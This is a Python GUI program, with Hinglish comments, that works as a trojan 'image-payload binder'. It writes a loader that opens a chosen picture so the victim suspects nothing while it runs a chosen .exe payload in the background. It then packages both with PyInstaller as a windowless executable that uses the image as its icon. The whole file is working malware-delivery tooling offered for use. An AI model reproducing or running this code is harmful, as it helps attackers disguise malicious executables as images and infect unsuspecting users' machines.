import customtkinter as ctk
from tkinter import filedialog, messagebox
import os

class AutoBinder(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Automatic Image-Payload Binder")
        self.geometry("500x400")

        self.label = ctk.CTkLabel(self, text="Create Auto-Run Image Payload", font=("Arial", 20, "bold"))
        self.label.pack(pady=20)

        # Inputs
        self.img_path = ""
        self.pay_path = ""

        self.btn_img = ctk.CTkButton(self, text="1. Select Display Image (.jpg)", command=self.get_img)
        self.btn_img.pack(pady=10)

        self.btn_pay = ctk.CTkButton(self, text="2. Select Payload (.exe)", command=self.get_pay)
        self.btn_pay.pack(pady=10)

        self.btn_build = ctk.CTkButton(self, text="Build Auto-Image.exe", fg_color="red", command=self.build)
        self.btn_build.pack(pady=30)

    def get_img(self): self.img_path = filedialog.askopenfilename()
    def get_pay(self): self.pay_path = filedialog.askopenfilename()

    def build(self):
        if not self.img_path or not self.pay_path:
            messagebox.showerror("Error", "Select both files!")
            return
        
        # Ek temp loader script generate karna
        with open("loader.py", "w") as f:
            f.write(f"""
import subprocess, os, sys
def run():
    # Asli image kholna taaki user ko shak na ho
    os.startfile('{os.path.basename(self.img_path)}')
    # Background mein payload run karna
    subprocess.Popen('{os.path.basename(self.pay_path)}', shell=True)

if __name__ == "__main__":
    run()
            """)
        
        # PyInstaller command jo sabko ek file mein bind kar degi
        os.system(f"pyinstaller --noconsole --onefile --add-data '{self.img_path};.' --add-data '{self.pay_path};.' --icon='{self.img_path}' loader.py")
        messagebox.showinfo("Success", "Build Complete! Check 'dist' folder.")

if __name__ == "__main__":
    app = AutoBinder()
    app.mainloop()
